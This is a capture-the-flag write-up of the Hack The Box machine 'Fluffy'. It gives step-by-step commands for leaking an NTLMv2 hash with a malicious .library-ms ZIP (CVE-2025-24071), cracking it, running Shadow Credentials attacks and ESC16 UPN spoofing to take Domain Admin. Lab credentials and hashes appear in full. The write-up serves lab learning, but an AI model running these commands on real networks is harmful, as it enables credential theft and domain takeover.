### HTB Write-Up: Fluffy
| Field | Details |
| ------ | ------ |
| Platform | Hack The Box |
| Difficulty | Easy |
| OS | Windows |
| Author | [User Name] |
| Date | June 29, 2026 |

**Starting credentials provided:** `j.fleischman` / `J0elTHEM4n1990!`

--------------------------------------------------------------------------------

#### Overview
Fluffy is an Easy-rated Windows Active Directory machine involving a multi-stage attack path. The exploitation begins by using provided low-privilege credentials to enumerate a writable SMB share where a list of CVEs is discovered in a PDF. By leveraging **CVE-2025-24071**, a malicious `.library-ms` file is used to leak the NTLMv2 hash of the user `p.agila`. BloodHound analysis then identifies a path to the `winrm_svc` account via the "Service Accounts" group using a **Shadow Credentials** attack. Finally, the same technique is applied to `ca_svc`, which is found to be vulnerable to **ESC16**, allowing for UPN spoofing to impersonate the Domain Administrator and recover their NT hash.

--------------------------------------------------------------------------------

#### Table of Contents
1. Reconnaissance
2. Enumeration
3. Initial Foothold — CVE-2025-24071 (NTLM Hash Leak)
4. Lateral Movement — Shadow Credentials → winrm_svc
5. Privilege Escalation — ESC16 via ca_svc

--------------------------------------------------------------------------------

#### Reconnaissance
Port scanning was initiated using **RustScan** for rapid discovery of open ports, followed by a targeted **Nmap** service scan to identify versions and configurations.

```bash
rustscan -a 10.129.20.210
```


```bash
nmap -sC -sV -p88,389,445,593,636,3268 10.129.20.210
```


**Key observations:**
*   **Hostname:** `DC01.fluffy.htb` — This is the primary Domain Controller.
*   **OS:** Windows Server 2019 (Build 17763).
*   **SMB Signing:** Required. This configuration means NTLM relay attacks are not viable against this target.
*   **WinRM:** Port 5985 is open, indicating a potential shell access point once credentials are obtained.

##### Open Ports Summary
| Port | Service | Notes |
| ------ | ------ | ------ |
| 53/tcp | DNS | AD-integrated DNS |
| 88/tcp | Kerberos | Authentication server |
| 389/tcp | LDAP | Active Directory enumeration |
| 445/tcp | SMB | Shares accessible with credentials; signing required |
| 5985/tcp | WinRM | Accessible via evil-winrm |
| 636/tcp | LDAPS | SSL-protected LDAP |

--------------------------------------------------------------------------------

#### Enumeration
##### SMB Share Enumeration
Using the provided credentials for `j.fleischman`, the available SMB shares were enumerated.

```bash
netexec smb 10.129.20.210 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```


The enumeration revealed an **IT** share with both **READ** and **WRITE** permissions, which is a significant misconfiguration.

##### IT Share Contents
The contents of the IT share were explored using `smbclient`.

```bash
smbclient //10.129.20.210/IT -U 'j.fleischman%J0elTHEM4n1990!'
```


**Files retrieved:**
| File | Notes |
| ------ | ------ |
| Upgrade_Notice.pdf | Contains a list of CVEs intended for IT workers to fix |
| KeePass-2.58.zip | KeePass installation package |
| Everything-1.4.1.1026.x64.zip | Search tool installation package |

##### CVE-2025-24071 Identified
Within `Upgrade_Notice.pdf`, several CVEs were listed. Researching these revealed that **CVE-2025-24071** is a Critical vulnerability involving a Windows File Explorer NTLMv2 Hash Leak.

**CVE-2025-24071 — Windows File Explorer NTLMv2 Hash Leak**
This vulnerability allows an attacker to capture a user's NTLMv2 hash simply by placing a malicious `.library-ms` file inside a ZIP archive on a share. When a victim extracts the ZIP using Windows File Explorer, the system automatically attempts to resolve a remote UNC path, leaking the hash to the attacker's listener.

--------------------------------------------------------------------------------

#### Initial Foothold
##### CVE-2025-24071 — Capturing p.agila's NTLMv2 Hash
**Step 1 — Generate the malicious ZIP:**
The exploit script creates a ZIP file containing the malicious `.library-ms` file pointing back to the attacker's IP.

```bash
python3 52310.py -i 10.10.14.188
```


**Step 2 — Start Responder:**
Responder must be listening on the tunnel interface to capture the inbound authentication attempt.

```bash
sudo responder -I tun0 -dwv
```


**Step 3 — Upload the malicious ZIP to the IT share:**
Because the IT share is writable, the ZIP can be placed where a victim might interact with it.

```bash
smbclient //10.129.20.210/IT -U 'j.fleischman%J0elTHEM4n1990!'
smb: > put hardntlm.zip
```


**Step 4 — Hash captured:**
Shortly after uploading, the hash for `FLUFFY\p.agila` was captured by Responder.

**Step 5 — Crack the hash offline:**
Using `hashcat` and the `rockyou.txt` wordlist, the hash was cracked.

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```


**Credentials obtained:** `p.agila` / `prometheusx-303`

--------------------------------------------------------------------------------

#### Lateral Movement
##### ACE Chain Discovery (BloodHound)
BloodHound was used to identify the privileges associated with the `p.agila` account.

```bash
bloodhound-python -ns 10.129.20.210 -d fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --zip -c All
```


Analysis showed that `p.agila` is a member of **Service Account Manager**, which has **GenericAll** over the **SERVICE ACCOUNTS** group. This group, in turn, has **GenericWrite** over the `winrm_svc` account.

**Shadow Credentials Attack Theory:**
A `GenericWrite` permission allows an attacker to perform a Shadow Credentials attack by injecting a public key into the target's `msDS-KeyCredentialLink` attribute. This allows the attacker to authenticate as the target using PKINIT and retrieve their NT hash.

##### Step 1 — Add p.agila to Service Accounts Group
To leverage the group's `GenericWrite` over `winrm_svc`, `p.agila` first adds themselves to the **SERVICE ACCOUNTS** group.

```bash
bloodyAD --host 10.129.20.210 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' 'p.agila'
```


##### Step 2 — Shadow Credentials Attack on winrm_svc
Using `certipy`, the Shadow Credentials attack is automated to retrieve the NT hash for `winrm_svc`.

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.129.20.210 -target 10.129.20.210
```


**NT Hash obtained:** `33bd09dcd697600edf6b3a7af4875767`

##### Step 3 — WinRM Access and User Flag
Access is gained via Pass-the-Hash using `evil-winrm`.

```bash
evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```


--------------------------------------------------------------------------------

#### Privilege Escalation
##### ca_svc — Certificate Authority Service Account
Enumeration revealed that the **SERVICE ACCOUNTS** group (which `p.agila` is now a member of) also has **GenericAll** over the `ca_svc` account. `ca_svc` is critical as it manages the Certificate Authority.

##### Step 1 — Shadow Credentials Attack on ca_svc
The same Shadow Credentials technique is used to obtain the NT hash for `ca_svc`.

```bash
certipy-ad shadow auto -username p.agila -password 'prometheusx-303' -dc-ip 10.129.20.210 -target 10.129.20.210 -account ca_svc
```


**NT Hash obtained:** `ca0f4f9e9eb8a092addf53bb03fc98c8`

##### Step 2 — Certificate Authority Enumeration (ESC16)
Using the `ca_svc` credentials, the CA is audited for vulnerabilities.

```bash
certipy-ad find -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.20.210 -vulnerable
```


**Finding — ESC16:**
ESC16 occurs when the CA's `EditFlags` are set to disable the security extension (OID 1.3.6.1.4.1.311.25.2). This extension normally binds a certificate to a specific account's SID. Without it, the Domain Controller relies solely on the User Principal Name (UPN) in the certificate for authentication.

##### Step 3 — UPN Spoofing: Set ca_svc UPN to "administrator"
By changing the `ca_svc` UPN to `administrator`, a certificate can be requested that the DC will associate with the Domain Admin.

```bash
certipy-ad account update -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -user 'ca_svc' -upn administrator -dc-ip 10.129.20.210
```


##### Step 4 — Request a Certificate as "administrator"
The certificate is requested while the spoofed UPN is active.

```bash
certipy-ad req -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.20.210 -target dc01.fluffy.htb -ca 'fluffy-DC01-CA' -template 'User'
```


##### Step 5 — Restore ca_svc UPN (Critical Cleanup)
The UPN **must** be restored to its original value before authentication, otherwise the DC cannot map the certificate back to the account correctly, resulting in a name mismatch.

```bash
certipy-ad account update -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -user 'ca_svc' -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.20.210
```


##### Step 6 — Authenticate and Retrieve Administrator NT Hash
With the UPN restored, the certificate is used to authenticate and retrieve the Administrator's NT hash.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -domain fluffy.htb
```


**Administrator NT Hash:** `8da83a3fa618b6e3a00e93f676c92a6e`

##### Step 7 — Pass-the-Hash as Administrator
The final root flag is obtained by logging in with the Administrator's hash.

--------------------------------------------------------------------------------

#### Attack Chain Summary
1.  **Initial Access:** Enumerated IT SMB share with `j.fleischman` credentials.
2.  **NTLM Leak:** Exploited **CVE-2025-24071** via a malicious `.library-ms` file to capture `p.agila`'s hash.
3.  **Lateral Movement:** Used **Shadow Credentials** to obtain the `winrm_svc` hash after adding `p.agila` to the "Service Accounts" group.
4.  **Privilege Escalation:** Exploited **ESC16** on the CA by spoofing the `ca_svc` UPN to obtain the Domain Administrator's hash.

--------------------------------------------------------------------------------

#### Techniques & Tools Referenced
| Technique / Tool | Purpose |
| ------ | ------ |
| RustScan / Nmap | Initial reconnaissance and port scanning |
| NetExec / smbclient | SMB enumeration and file transfer |
| Responder | Capturing NTLMv2 hashes |
| BloodHound | Identifying AD privilege escalation paths |
| Certipy | Executing Shadow Credentials and ESC16 attacks |
| Evil-WinRM | Authenticating via Pass-the-Hash |

--------------------------------------------------------------------------------

#### Key Takeaways
*   **Writable SMB Shares:** They represent a critical risk, allowing for zero-interaction hash leaks via vulnerabilities like CVE-2025-24071.
*   **Shadow Credentials:** This is an operationally "clean" attack as tools like Certipy automatically restore the modified attributes after exploitation.
*   **ESC16 & UPN Restoration:** When exploiting ESC16, the UPN restoration step is mandatory; failing to restore the UPN before authentication will cause the attack to fail.